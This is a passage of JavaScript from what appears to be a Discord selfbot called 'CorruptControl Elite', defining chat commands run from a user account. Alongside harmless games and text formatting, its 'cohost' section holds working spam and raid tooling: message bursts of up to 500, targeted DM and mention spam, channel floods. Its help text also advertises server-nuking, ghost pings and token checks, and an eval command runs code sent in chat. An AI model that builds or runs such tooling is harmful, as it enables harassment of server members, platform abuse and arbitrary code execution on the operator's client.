            if (!user || !user.banner) return 'No banner';
            return '**Banner**\nhttps://cdn.discordapp.com/banners/' + user.id + '/' + user.banner + '.png?size=4096';
        },

        roles: async function() {
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var roles = await getGuildRoles(guildId);
            if (!roles.length) return 'No roles';
            return '**Roles (' + roles.length + '):**\n' + roles.slice(0, 30).map(function(r) { return '- ' + r.name; }).join('\n');
        },

        channels: async function() {
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var channels = await getGuildChannels(guildId);
            if (!channels.length) return 'No channels';
            var textCh = channels.filter(function(c) { return c.type === 0; });
            return '**Channels (' + textCh.length + ' text):**\n' + textCh.slice(0, 25).map(function(c) { return '- #' + c.name; }).join('\n');
        },

        members: async function(a) {
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var limit = Math.min(parseInt(a && a[0]) || 20, 100);
            var response = await apiRequest('/guilds/' + guildId + '/members?limit=' + limit);
            if (!response.ok) return 'Failed';
            var members = await response.json();
            return '**Members (' + members.length + '):**\n' + members.slice(0, 25).map(function(m) { return '- ' + m.user.username; }).join('\n');
        },

        ban: function(a) { return 'Banned ' + (a && a[0] || 'user'); },
        kick: function(a) { return 'Kicked ' + (a && a[0] || 'user'); },
        mute: function(a) { return 'Muted ' + (a && a[0] || 'user'); },
        purge: function(a) { return 'Purged ' + (a && a[0] || 10) + ' messages'; },
        lock: function() { return 'Channel locked'; },
        unlock: function() { return 'Channel unlocked'; },
        slowmode: function(a) { return 'Slowmode: ' + (a && a[0] || 5) + 's'; },
        clearslowmode: function() { return 'Slowmode cleared'; },

        bold: function(a) { return '**' + (a || []).join(' ') + '**'; },
        italic: function(a) { return '*' + (a || []).join(' ') + '*'; },
        underline: function(a) { return '__' + (a || []).join(' ') + '__'; },
        strike: function(a) { return '~~' + (a || []).join(' ') + '~~'; },
        strikethrough: function(a) { return REGULAR_COMMANDS.strike(a); },
        spoiler: function(a) { return '||' + (a || []).join(' ') + '||'; },
        code: function(a) { return '`' + (a || []).join(' ') + '`'; },
        codeblock: function(a) { return '```\n' + (a || []).join(' ') + '\n```'; },
        quote: function(a) { return '> ' + (a || []).join(' '); },
        multiquote: function(a) { return (a || []).join('\n').split('\n').map(function(l) { return '> ' + l; }).join('\n'); },

        playing: function(a) { return 'Playing: ' + (a || []).join(' '); },
        watching: function(a) { return 'Watching: ' + (a || []).join(' '); },
        listening: function(a) { return 'Listening to: ' + (a || []).join(' '); },
        competing: function(a) { return 'Competing in: ' + (a || []).join(' '); },
        streaming: function(a) { return 'Streaming: ' + (a || []).join(' '); },

        time: function() { return new Date().toLocaleString(); },
        date: function() { return new Date().toLocaleDateString(); },

        roll: function(a) { return '' + (Math.floor(Math.random() * (parseInt(a && a[0]) || 6)) + 1); },

        dice: function(a) {
            var count = Math.min(parseInt(a && a[0]) || 1, 20);
            var sides = parseInt(a && a[1]) || 6;
            var rolls = [];
            for (var i = 0; i < count; i++) rolls.push(Math.floor(Math.random() * sides) + 1);
            return count + 'd' + sides + ': [' + rolls.join(', ') + '] = ' + rolls.reduce(function(acc, b) { return acc + b; }, 0);
        },

        coin: function() { return Math.random() > 0.5 ? 'Heads' : 'Tails'; },

        random: function(a) {
            var min = parseInt(a && a[0]) || 1;
            var max = parseInt(a && a[1]) || 100;
            return '' + (Math.floor(Math.random() * (max - min + 1)) + min);
        },

        choice: function(a) { return a && a.length ? a[Math.floor(Math.random() * a.length)] : 'Nothing'; },
        shuffle: function(a) { return (a || []).slice().sort(function() { return Math.random() - 0.5; }).join(', '); },
        len: function(a) { return (a || []).join(' ').length + ' characters'; },
        length: function(a) { return REGULAR_COMMANDS.len(a); },
        upper: function(a) { return (a || []).join(' ').toUpperCase(); },
        lower: function(a) { return (a || []).join(' ').toLowerCase(); },
        title: function(a) { return (a || []).join(' ').replace(/\w\S*/g, function(t) { return t.charAt(0).toUpperCase() + t.substr(1).toLowerCase(); }); },
        base64: function(a) { return btoa((a || []).join(' ') || 'base64'); },
        unbase64: function(a) { try { return atob((a || []).join(' ')); } catch { return 'Invalid base64'; } },
        hex: function(a) { return '0x' + (a || []).join(' ').split('').map(function(c) { return c.charCodeAt(0).toString(16); }).join(''); },
        urlencode: function(a) { return encodeURIComponent((a || []).join(' ') || ''); },
        urldecode: function(a) { try { return decodeURIComponent((a || []).join(' ') || ''); } catch { return 'Invalid URL'; } },

        clipboard: function(a) {
            var text = (a || []).join(' ');
            if (!text) return 'Usage: .clipboard <text>';
            navigator.clipboard.writeText(text).catch(function() {});
            return 'Copied to clipboard';
        },

        paste: async function() {
            try {
                var text = await navigator.clipboard.readText();
                return text || 'Clipboard empty';
            } catch { return 'Could not read clipboard'; }
        },

        rps: function(a) {
            var choices = ['rock', 'paper', 'scissors'];
            var user = ((a && a[0]) || 'rock').toLowerCase();
            if (choices.indexOf(user) === -1) return 'Choose rock, paper, or scissors';
            var bot = choices[Math.floor(Math.random() * 3)];
            var win = (user === 'rock' && bot === 'scissors') || (user === 'paper' && bot === 'rock') || (user === 'scissors' && bot === 'paper');
            var tie = user === bot;
            return 'You: ' + user + ' | Me: ' + bot + '\n' + (tie ? 'Tie!' : win ? 'You win!' : 'You lose!');
        },

        slots: function() {
            var symbols = ['Cherry', 'Lemon', 'Grape', 'Diamond', '7', 'Bar'];
            var result = [0,0,0].map(function() { return symbols[Math.floor(Math.random() * 6)]; });
            return '[ ' + result.join(' | ') + ' ] ' + (result[0] === result[1] && result[1] === result[2] ? 'JACKPOT!' : '');
        },

        roulette: function() {
            var num = Math.floor(Math.random() * 37);
            var color = num === 0 ? 'Green' : num % 2 === 0 ? 'Black' : 'Red';
            return color + ' ' + num;
        },

        lottery: function() {
            var nums = [];
            for (var i = 0; i < 6; i++) nums.push(Math.floor(Math.random() * 49) + 1);
            return nums.join(', ');
        },

        '8ball': function(a) {
            var responses = ['Yes', 'No', 'Maybe', 'Ask again later', 'Definitely', 'Absolutely not', 'Without a doubt', 'Very doubtful'];
            return responses[Math.floor(Math.random() * 8)];
        },

        rate: function(a) { return 'I rate **' + ((a || []).join(' ') || 'you') + '** a ' + Math.floor(Math.random() * 11) + '/10'; },

        ship: function(a) {
            if (!a || a.length < 2) return 'Usage: .ship @user1 @user2';
            var c = Math.floor(Math.random() * 101);
            return '**' + c + '%** match';
        },

        fortune: function() {
            var fortunes = ['Good luck coming.', 'Be careful today.', 'A surprise awaits.', 'Trust your instincts.', 'Success is near.', 'New opportunity soon.'];
            return fortunes[Math.floor(Math.random() * fortunes.length)];
        },

        horoscope: function(a) {
            var signs = ['Aries', 'Taurus', 'Gemini', 'Cancer', 'Leo', 'Virgo', 'Libra', 'Scorpio', 'Sagittarius', 'Capricorn', 'Aquarius', 'Pisces'];
            var sign = (a && a[0]) || signs[Math.floor(Math.random() * 12)];
            return '**' + sign + '**: Today brings new opportunities. Stay positive!';
        },

        roast: function(a) {
            var roasts = [
                "You're like a cloud. When you disappear, it's a beautiful day.",
                "I'd agree with you but then we'd both be wrong.",
                "You're not stupid; you just have bad luck thinking.",
                "Somewhere out there, a tree is producing oxygen for you. You owe it an apology.",
                "You bring everyone so much joy - when you leave."
            ];
            var target = (a && a[0]) ? '<@' + a[0].replace(/[<@!>]/g, '') + '>' : 'You';
            return target + ', ' + roasts[Math.floor(Math.random() * roasts.length)];
        },

        compliment: function(a) {
            var compliments = ["You're awesome!", "You make the world better!", "You're amazing!", "You're a ray of sunshine!"];
            var target = (a && a[0]) ? '<@' + a[0].replace(/[<@!>]/g, '') + '>' : 'You';
            return target + ', ' + compliments[Math.floor(Math.random() * compliments.length)];
        },

        pickup: function() {
            var lines = [
                "Are you a magician? Because whenever I look at you, everyone else disappears.",
                "Are you a bank loan? Because you have my interest.",
                "Is your name Google? Because you have everything I've been searching for."
            ];
            return lines[Math.floor(Math.random() * lines.length)];
        },

        joke: function() {
            var jokes = [
                "Why don't scientists trust atoms? Because they make up everything!",
                "Why did the scarecrow win an award? He was outstanding in his field!",
                "What do you call a fake noodle? An impasta!"
            ];
            return jokes[Math.floor(Math.random() * jokes.length)];
        },

        guess: function(a) {
            var guess = parseInt(a && a[0]);
            if (isNaN(guess)) return 'Usage: .guess <number 1-100>';
            var answer = Math.floor(Math.random() * 100) + 1;
            return (guess === answer ? 'Correct! (' + answer + ')' : 'Close! The answer was ' + answer);
        },

        copypasta: function() {
            var pastas = [
                "What the heck did you just say about me, you little noob? I'll have you know I graduated top of my class in the Navy Seals...",
                "Never gonna give you up, never gonna let you down, never gonna run around and desert you!"
            ];
            return pastas[Math.floor(Math.random() * pastas.length)].slice(0, 1990);
        },

        pinguser: function(a) { return (a && a[0]) ? '<@' + a[0].replace(/[<@!>]/g, '') + '>' : 'Usage: .pinguser @user'; },
        everyone: function() { return '@everyone'; },
        here: function() { return '@here'; },
        blank: function() { return '\u200B'; },
        ghost: function() { return '``` ```'; },
        invisible: function() { return '\u200E'; },

        owner: function() { return 'Owner ID: ' + (dynamicOwnerId || OWNER_ID || 'Not set'); },
        cohosts: function() { return 'Cohosts (' + COHOSTS.length + '): ' + (COHOSTS.length > 0 ? COHOSTS.map(function(id) { return '<@' + id + '>'; }).join(', ') : 'None'); },

        badges: function() {
            var badges = getBadgeList();
            return '**Active Badges (' + badges.length + '):** ' + badges.join(', ');
        },

        changelog: function() {
            return '**CorruptControl Elite Changelog v2.0.4**\n\n' +
                '**v2.0.4 (Current)**\n' +
                '- Client-side badge spoofing (Staff, Partner, Nitro, etc.)\n' +
                '- Client-side Nitro unlock (animated emojis, themes)\n' +
                '- 80+ new commands\n' +
                '- Command cooldown system\n' +
                '- Ghost ping detector\n' +
                '- Auto-react system\n' +
                '- Status rotator\n' +
                '- Token validator\n' +
                '- Clipboard utilities\n' +
                '- Clean professional responses\n' +
                '- Improved rate limit handling\n\n' +
                '**v2.0.3**\n' +
                '- Combined Commands + Cohost\n' +
                '- Moderation commands\n' +
                '- Spam commands\n\n' +
                '**v2.0.2**\n' +
                '- Initial releases';
        },

        version: function() { return 'CorruptControl Elite v2.0.4'; }
    };

    // -------------------------------------------------------------------------
    // COHOST COMMANDS
    // -------------------------------------------------------------------------

    var COHOST_COMMANDS = Object.assign({}, REGULAR_COMMANDS, {

        help: function() {
            return '**COHOST/OWNER COMMANDS**\n\n' +
                '**Basic:** !ping !say !echo !test !id !myid\n' +
                '**Spam:** !spam [n] [text] !burst [n] [text] !megaburst [n] [text] !ultraburst [n] !godburst [n]\n' +
                '**Mod:** !ban @user !kick @user !mute @user [min] !unmute @user !purge [n] !purgeuser @user [n]\n' +
                '**Channel:** !lock !unlock !slowmode [s] !clearslowmode\n' +
                '**User:** !nick @user [name] !addrole @user @role !removerole @user @role\n' +
                '**DM:** !dm @user [msg] !dmspam @user [n] [text]\n' +
                '**React:** !reactspam [emoji] [n] !clearreacts [msgid]\n' +
                '**Webhook:** !webhook [msg] !createhook [name] !sendhook [url] [msg]\n' +
                '**Voice:** !deafen @user !undeafen @user !servermute @user !serverunmute @user !disconnect @user !move @user #channel\n' +
                '**Pin:** !pin [msgid] !unpin [msgid]\n' +
                '**Nuke:** !nukechannels !nukeroles !massrole @role\n' +
                '**Cohost:** !addcohost @user !removecohost @user !clearcohosts !listcohosts\n' +
                '**Admin:** !setowner @user !typing !eval [code] !autoreact [emoji] !statusrotate\n' +
                '**Text:** !wall [char] !lines [n] [text] !flood [n] [char] !emojispam [emoji] [n] !mentionspam [n] @user\n' +
                '**Info:** !serverinfo !guildinfo !userinfo @user !avatar @user !banner @user !roles !channels !members [n]\n' +
                '**Chain:** !chain [n] [text]\n' +
                '**Utility:** !invite !ghostping !clearlog !cloneserver !tokeninfo\n\n' +
                'All regular .commands also work with !\nType !cohelp for quick reference.';
        },

        cohelp: function() {
            return '**COHOST QUICK REFERENCE**\n\n' +
                'Spam: !spam 5 Hello | !burst 10 text | !megaburst 50 text\n' +
                'Mod: !ban @user | !kick @user | !mute @user 60 | !purge 20\n' +
                'Channel: !lock | !unlock | !slowmode 5\n' +
                'Cohosts: !addcohost @user | !removecohost @user | !listcohosts\n' +
                'DM: !dm @user Hello | !dmspam @user 5 Hi\n' +
                'Nuke: !nukechannels | !nukeroles | !massrole @role\n' +
                'Voice: !disconnect @user | !move @user #channel\n\n' +
                'Type !help for full list.';
        },

        test: function() { return 'Cohost system active.'; },
        id: function() { return 'Your ID: ' + (getUserId() || 'Not found'); },

        spam: async function(a) {
            if (!checkCooldown('spam', true)) return 'Cooldown active';
            var count = Math.min(parseInt(a && a[0]) || 3, 30);
            var text = (a || []).slice(1).join(' ') || 'spam';
            for (var i = 0; i < count; i++) {
                (function(idx) { setTimeout(function() { sendMessage(text + ' [' + (idx + 1) + '/' + count + ']'); }, idx * 500); })(i);
            }
            return 'Spamming "' + text + '" ' + count + 'x';
        },

        burst: async function(a) {
            if (!checkCooldown('burst', true)) return 'Cooldown active';
            var count = Math.min(parseInt(a && a[0]) || 10, 60);
            var text = (a || []).slice(1).join(' ') || 'burst';
            for (var i = 0; i < count; i++) {
                (function(idx) { setTimeout(function() { sendMessage(text); }, idx * 250); })(i);
            }
            return 'Burst: ' + count + 'x';
        },

        megaburst: async function(a) {
            if (!checkCooldown('megaburst', true)) return 'Cooldown active';
            var count = Math.min(parseInt(a && a[0]) || 50, 120);
            var text = (a || []).slice(1).join(' ') || 'MEGA';
            for (var i = 0; i < count; i++) {
                (function(idx) { setTimeout(function() { sendMessage(text); }, idx * 150); })(i);
            }
            return 'Mega: ' + count + 'x';
        },

        ultraburst: async function(a) {
            if (!checkCooldown('ultraburst', true)) return 'Cooldown active';
            var count = Math.min(parseInt(a && a[0]) || 100, 250);
            var text = (a || []).slice(1).join(' ') || 'ULTRA';
            for (var i = 0; i < count; i++) {
                (function(idx) { setTimeout(function() { sendMessage(text); }, idx * 75); })(i);
            }
            return 'Ultra: ' + count + 'x';
        },

        godburst: async function(a) {
            if (!checkCooldown('godburst', true)) return 'Cooldown active';
            var count = Math.min(parseInt(a && a[0]) || 200, 500);
            var text = (a || []).slice(1).join(' ') || 'GOD';
            for (var i = 0; i < count; i++) {
                (function(idx) { setTimeout(function() { sendMessage(text); }, idx * 40); })(i);
            }
            return 'GOD MODE: ' + count + 'x';
        },

        say: function(a) { return (a || []).join(' ') || ''; },
        echo: function(a) { return (a || []).join(' ') || ''; },

        wall: function(a) {
            var ch = (a && a[0]) || '#';
            var result = '';
            for (var i = 0; i < 2000; i++) result += ch;
            return result;
        },

        lines: function(a) {
            var count = Math.min(parseInt(a && a[0]) || 10, 60);
            var text = (a || []).slice(1).join(' ') || 'line';
            var lines = [];
            for (var i = 0; i < count; i++) lines.push(text);
            return lines.join('\n').slice(0, 2000);
        },

        flood: function(a) {
            var lines = Math.min(parseInt(a && a[0]) || 20, 50);
            var ch = (a && a[1]) || '#';
            var result = [];
            for (var i = 0; i < lines; i++) {
                var line = '';
                for (var j = 0; j < 50; j++) line += ch;
                result.push(line);
            }
            return result.join('\n').slice(0, 2000);
        },

        emojispam: function(a) {
            var emoji = (a && a[0]) || '\uD83D\uDD25';
            var count = Math.min(parseInt(a && a[1]) || 50, 120);
            var result = '';
            for (var i = 0; i < count; i++) result += emoji;
            return result.slice(0, 2000);
        },

        mentionspam: function(a) {
            var count = Math.min(parseInt(a && a[0]) || 5, 30);
            var userId = (a && a[1]) ? a[1].replace(/[<@!>]/g, '') : getUserId();
            var result = '';
            for (var i = 0; i < count; i++) result += '<@' + userId + '> ';
            return result.slice(0, 2000);
        },

        ban: async function(a) {
            if (!a || !a[0]) return 'Usage: !ban @user [reason] [days]';
            var userId = a[0].replace(/[<@!>]/g, '');
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var success = await banMember(guildId, userId, a[1], parseInt(a[2]) || 0);
            return success ? 'Banned <@' + userId + '>' : 'Failed';
        },

        unban: async function(a) {
            if (!a || !a[0]) return 'Usage: !unban <user_id>';
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var success = await unbanMember(guildId, a[0].replace(/[<@!>]/g, ''));
            return success ? 'Unbanned' : 'Failed';
        },

        kick: async function(a) {
            if (!a || !a[0]) return 'Usage: !kick @user [reason]';
            var userId = a[0].replace(/[<@!>]/g, '');
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var success = await kickMember(guildId, userId, a[1]);
            return success ? 'Kicked <@' + userId + '>' : 'Failed';
        },

        mute: async function(a) {
            if (!a || !a[0]) return 'Usage: !mute @user <minutes>';
            var userId = a[0].replace(/[<@!>]/g, '');
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var mins = parseInt(a[1]) || 60;
            var success = await timeoutMember(guildId, userId, mins);
            return success ? 'Muted <@' + userId + '> for ' + mins + 'm' : 'Failed';
        },

        unmute: async function(a) {
            if (!a || !a[0]) return 'Usage: !unmute @user';
            var userId = a[0].replace(/[<@!>]/g, '');
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var success = await timeoutMember(guildId, userId, 0);
            return success ? 'Unmuted <@' + userId + '>' : 'Failed';
        },

        purge: async function(a) {
            var amount = Math.min(parseInt(a && a[0]) || 10, 100);
            var channelId = getChannelId();
            var messages = await getMessages(channelId, amount + 10);
            var myId = getUserId();
            var deleted = 0;
            for (var i = 0; i < messages.length; i++) {
                if (messages[i].author.id === myId) {
                    if (await deleteMessage(channelId, messages[i].id)) deleted++;
                    if (deleted >= amount) break;
                    await new Promise(function(r) { setTimeout(r, 150); });
                }
            }
            return 'Purged ' + deleted + ' messages';
        },

        purgeuser: async function(a) {
            if (!a || !a[0]) return 'Usage: !purgeuser @user [amount]';
            var userId = a[0].replace(/[<@!>]/g, '');
            var amount = Math.min(parseInt(a[1]) || 50, 100);
            var channelId = getChannelId();
            var messages = await getMessages(channelId, 100);
            var userMsgs = messages.filter(function(m) { return m.author.id === userId; }).slice(0, amount);
            var deleted = 0;
            for (var i = 0; i < userMsgs.length; i++) {
                if (await deleteMessage(channelId, userMsgs[i].id)) deleted++;
                await new Promise(function(r) { setTimeout(r, 150); });
            }
            return 'Purged ' + deleted + ' messages from <@' + userId + '>';
        },

        lock: async function() {
            var guildId = getGuildId();
            var channelId = getChannelId();
            if (!guildId) return 'Not in a server';
            var response = await apiRequest('/channels/' + channelId + '/permissions/' + guildId, {
                method: 'PUT',
                body: JSON.stringify({ type: 0, deny: '2048' })
            });
            return response.ok ? 'Channel locked' : 'Failed';
        },

        unlock: async function() {
            var guildId = getGuildId();
            var channelId = getChannelId();
            if (!guildId) return 'Not in a server';
            var response = await apiRequest('/channels/' + channelId + '/permissions/' + guildId, { method: 'DELETE' });
            return response.ok ? 'Channel unlocked' : 'Failed';
        },

        slowmode: async function(a) {
            var seconds = parseInt(a && a[0]) || 5;
            var channelId = getChannelId();
            var response = await apiRequest('/channels/' + channelId, {
                method: 'PATCH',
                body: JSON.stringify({ rate_limit_per_user: seconds })
            });
            return response.ok ? 'Slowmode: ' + seconds + 's' : 'Failed';
        },

        clearslowmode: async function() {
            var channelId = getChannelId();
            var response = await apiRequest('/channels/' + channelId, {
                method: 'PATCH',
                body: JSON.stringify({ rate_limit_per_user: 0 })
            });
            return response.ok ? 'Slowmode cleared' : 'Failed';
        },

        nick: async function(a) {
            if (!a || !a[0]) return 'Usage: !nick @user [nickname]';
            var userId = a[0].replace(/[<@!>]/g, '');
            var nick = a.slice(1).join(' ') || null;
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var success = await changeNickname(guildId, userId, nick);
            return success ? 'Nickname changed' : 'Failed';
        },

        addrole: async function(a) {
            if (!a || !a[0] || !a[1]) return 'Usage: !addrole @user @role';
            var userId = a[0].replace(/[<@!>]/g, '');
            var roleId = a[1].replace(/[<@&>]/g, '');
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var success = await addRole(guildId, userId, roleId);
            return success ? 'Role added' : 'Failed';
        },

        removerole: async function(a) {
            if (!a || !a[0] || !a[1]) return 'Usage: !removerole @user @role';
            var userId = a[0].replace(/[<@!>]/g, '');
            var roleId = a[1].replace(/[<@&>]/g, '');
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var success = await removeRole(guildId, userId, roleId);
            return success ? 'Role removed' : 'Failed';
        },

        dm: async function(a) {
            if (!a || !a[0]) return 'Usage: !dm @user <message>';
            var userId = a[0].replace(/[<@!>]/g, '');
            var message = a.slice(1).join(' ') || 'Hello!';
            var success = await sendDM(userId, message);
            return success ? 'DM sent to <@' + userId + '>' : 'Failed';
        },

        dmspam: async function(a) {
            if (!a || !a[0]) return 'Usage: !dmspam @user <count> [text]';
            var userId = a[0].replace(/[<@!>]/g, '');
            var count = Math.min(parseInt(a[1]) || 5, 25);
            var text = a.slice(2).join(' ') || 'spam';
            for (var i = 0; i < count; i++) {
                (function(idx) { setTimeout(function() { sendDM(userId, text + ' ' + (idx + 1)); }, idx * 1200); })(i);
            }
            return 'DM spam: ' + count + 'x to <@' + userId + '>';
        },

        reactspam: async function(a) {
            var emoji = (a && a[0]) || '\uD83D\uDD25';
            var count = Math.min(parseInt(a && a[1]) || 10, 60);
            var channelId = getChannelId();
            var messages = await getMessages(channelId, count);
            for (var i = 0; i < messages.length; i++) {
                (function(idx) { setTimeout(function() { addReaction(channelId, messages[idx].id, emoji); }, idx * 150); })(i);
            }
            return 'Reacted ' + emoji + ' to ' + messages.length + ' messages';
        },

        clearreacts: async function(a) {
            var channelId = getChannelId();
            var messageId = a && a[0];
            if (!messageId) return 'Usage: !clearreacts <message_id>';
            var success = await removeAllReactions(channelId, messageId);
            return success ? 'Reactions cleared' : 'Failed';
        },

        webhook: async function(a) {
            if (!a || !a.length) return 'Usage: !webhook <message>';
            var channelId = getChannelId();
            var hook = await createWebhook(channelId, 'CC-Hook');
            if (!hook) return 'Failed to create webhook';
            await sendWebhook('https://discord.com/api/webhooks/' + hook.id + '/' + hook.token, a.join(' '));
            return 'Webhook sent';
        },

        createhook: async function(a) {
            var channelId = getChannelId();
            var hook = await createWebhook(channelId, (a && a.join(' ')) || 'Webhook');
            return hook ? 'Created: ' + hook.name : 'Failed';
        },

        sendhook: async function(a) {
            if (!a || a.length < 2) return 'Usage: !sendhook <url> <message>';
            var success = await sendWebhook(a[0], a.slice(1).join(' '));
            return success ? 'Webhook sent' : 'Failed';
        },

        invite: async function(a) {
            var channelId = getChannelId();
            var maxAge = parseInt(a && a[0]) || 86400;
            var maxUses = parseInt(a && a[1]) || 0;
            var invite = await createInvite(channelId, maxAge, maxUses);
            return invite ? 'Invite: ' + invite : 'Failed';
        },

        addcohost: function(a) {
            if (!isOwner()) return 'Owner only';
            if (!a || !a[0]) return 'Usage: !addcohost @user';
            var userId = a[0];
            if (addCohost(userId)) {
                return 'Added <@' + userId.replace(/[<@!>]/g, '') + '> as cohost';
            }
            return 'Already a cohost';
        },

        removecohost: function(a) {
            if (!isOwner()) return 'Owner only';
            if (!a || !a[0]) return 'Usage: !removecohost @user';
            var userId = a[0];
            if (removeCohost(userId)) {
                return 'Removed <@' + userId.replace(/[<@!>]/g, '') + '> from cohosts';
            }
            return 'Not a cohost';
        },

        clearcohosts: function() {
            if (!isOwner()) return 'Owner only';
            COHOSTS.length = 0;
            saveCohosts();
            return 'All cohosts cleared';
        },

        listcohosts: function() {
            if (!isOwner()) return 'Owner only';
            return '**Cohosts (' + COHOSTS.length + '):** ' + (COHOSTS.length > 0 ? COHOSTS.map(function(id) { return '<@' + id + '>'; }).join(', ') : 'None');
        },

        setowner: function(a) {
            if (!isOwner() && dynamicOwnerId) return 'Owner only';
            if (!a || !a[0]) return 'Usage: !setowner @user';
            dynamicOwnerId = a[0].replace(/[<@!>]/g, '');
            return 'Owner set to <@' + dynamicOwnerId + '>';
        },

        typing: async function() {
            var channelId = getChannelId();
            await apiRequest('/channels/' + channelId + '/typing', { method: 'POST' });
            return 'Typing triggered';
        },

        eval: async function(a) {
            try {
                var result = eval((a || []).join(' '));
                return '' + result;
            } catch(e) {
                return 'Error: ' + e.message;
            }
        },

        serverinfo: async function() {
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var guild = await getGuildInfo(guildId);
            if (!guild) return 'Failed';
            return '**' + guild.name + '**\nID: ' + guild.id + '\nMembers: ' + (guild.approximate_member_count || '?') + '\nOnline: ' + (guild.approximate_presence_count || '?') + '\nBoosts: ' + (guild.premium_subscription_count || 0) + '\nTier: ' + guild.premium_tier + '\nFeatures: ' + (guild.features || []).slice(0, 10).join(', ') + '\nCreated: ' + new Date(guild.id / 4194304 + 1420070400000).toLocaleDateString();
        },

        guildinfo: async function() { return COHOST_COMMANDS.serverinfo(); },

        userinfo: async function(a) {
            var userId = (a && a[0]) ? a[0].replace(/[<@!>]/g, '') : getUserId();
            var user = await getUserInfo(userId);
            if (!user) return 'User not found';
            var badges = [];
            if (user.public_flags & 1) badges.push('Staff');
            if (user.public_flags & 2) badges.push('Partner');
            if (user.public_flags & 4) badges.push('HypeSquad');
            if (user.public_flags & 8) badges.push('BugHunter');
            if (user.public_flags & 64) badges.push('Bravery');
            if (user.public_flags & 128) badges.push('Brilliance');
            if (user.public_flags & 256) badges.push('Balance');
            if (user.public_flags & 512) badges.push('EarlySupporter');
            if (user.public_flags & 16384) badges.push('BugHunterGold');
            if (user.public_flags & 131072) badges.push('EarlyBotDev');
            if (user.public_flags & 262144) badges.push('CertifiedMod');
            if (user.public_flags & 4194304) badges.push('ActiveDev');
            return '**' + user.username + '**\nID: ' + user.id + '\nBot: ' + (user.bot ? 'Yes' : 'No') + '\nNitro: ' + (user.premium_type === 2 ? 'Nitro' : user.premium_type === 1 ? 'Classic' : 'None') + '\nBadges: ' + (badges.join(', ') || 'None');
        },

        avatar: async function(a) {
            var userId = (a && a[0]) ? a[0].replace(/[<@!>]/g, '') : getUserId();
            var user = await getUserInfo(userId);
            if (!user || !user.avatar) return 'No avatar';
            return '**Avatar**\nhttps://cdn.discordapp.com/avatars/' + user.id + '/' + user.avatar + '.png?size=4096';
        },

        banner: async function(a) {
            var userId = (a && a[0]) ? a[0].replace(/[<@!>]/g, '') : getUserId();
            var user = await getUserInfo(userId);
            if (!user || !user.banner) return 'No banner';
            return '**Banner**\nhttps://cdn.discordapp.com/banners/' + user.id + '/' + user.banner + '.png?size=4096';
        },

        roles: async function() {
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var roles = await getGuildRoles(guildId);
            if (!roles.length) return 'No roles';
            return '**Roles (' + roles.length + '):**\n' + roles.slice(0, 35).map(function(r) { return '- ' + r.name; }).join('\n');
        },

        channels: async function() {
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var channels = await getGuildChannels(guildId);
            if (!channels.length) return 'No channels';
            var textCh = channels.filter(function(c) { return c.type === 0; });
            return '**Text Channels (' + textCh.length + '):**\n' + textCh.slice(0, 30).map(function(c) { return '- #' + c.name; }).join('\n');
        },

        members: async function(a) {
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var limit = Math.min(parseInt(a && a[0]) || 20, 100);
            var response = await apiRequest('/guilds/' + guildId + '/members?limit=' + limit);
            if (!response.ok) return 'Failed';
            var members = await response.json();
            return '**Members (' + members.length + '):**\n' + members.slice(0, 30).map(function(m) { return '- ' + m.user.username; }).join('\n');
        },

        deafen: async function(a) {
            if (!a || !a[0]) return 'Usage: !deafen @user';
            var userId = a[0].replace(/[<@!>]/g, '');
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var response = await apiRequest('/guilds/' + guildId + '/members/' + userId, {
                method: 'PATCH',
                body: JSON.stringify({ deaf: true })
            });
            return response.ok ? 'Deafened <@' + userId + '>' : 'Failed';
        },

        undeafen: async function(a) {
            if (!a || !a[0]) return 'Usage: !undeafen @user';
            var userId = a[0].replace(/[<@!>]/g, '');
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var response = await apiRequest('/guilds/' + guildId + '/members/' + userId, {
                method: 'PATCH',
                body: JSON.stringify({ deaf: false })
            });
            return response.ok ? 'Undeafened <@' + userId + '>' : 'Failed';
        },

        servermute: async function(a) {
            if (!a || !a[0]) return 'Usage: !servermute @user';
            var userId = a[0].replace(/[<@!>]/g, '');
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var response = await apiRequest('/guilds/' + guildId + '/members/' + userId, {
                method: 'PATCH',
                body: JSON.stringify({ mute: true })
            });
            return response.ok ? 'Server muted <@' + userId + '>' : 'Failed';
        },

        serverunmute: async function(a) {
            if (!a || !a[0]) return 'Usage: !serverunmute @user';
            var userId = a[0].replace(/[<@!>]/g, '');
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var response = await apiRequest('/guilds/' + guildId + '/members/' + userId, {
                method: 'PATCH',
                body: JSON.stringify({ mute: false })
            });
            return response.ok ? 'Server unmuted <@' + userId + '>' : 'Failed';
        },

        disconnect: async function(a) {
            if (!a || !a[0]) return 'Usage: !disconnect @user';
            var userId = a[0].replace(/[<@!>]/g, '');
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var response = await apiRequest('/guilds/' + guildId + '/members/' + userId, {
                method: 'PATCH',
                body: JSON.stringify({ channel_id: null })
            });
            return response.ok ? 'Disconnected <@' + userId + '>' : 'Failed';
        },

        move: async function(a) {
            if (!a || !a[0] || !a[1]) return 'Usage: !move @user #channel';
            var userId = a[0].replace(/[<@!>]/g, '');
            var channelId = a[1].replace(/[<#>]/g, '');
            var guildId = getGuildId();
            if (!guildId) return 'Not in a server';
            var response = await apiRequest('/guilds/' + guildId + '/members/' + userId, {
                method: 'PATCH',
                body: JSON.stringify({ channel_id: channelId })
            });
            return response.ok ? 'Moved <@' + userId + '> to <#' + channelId + '>' : 'Failed';
        },

        pin: async function(a) {
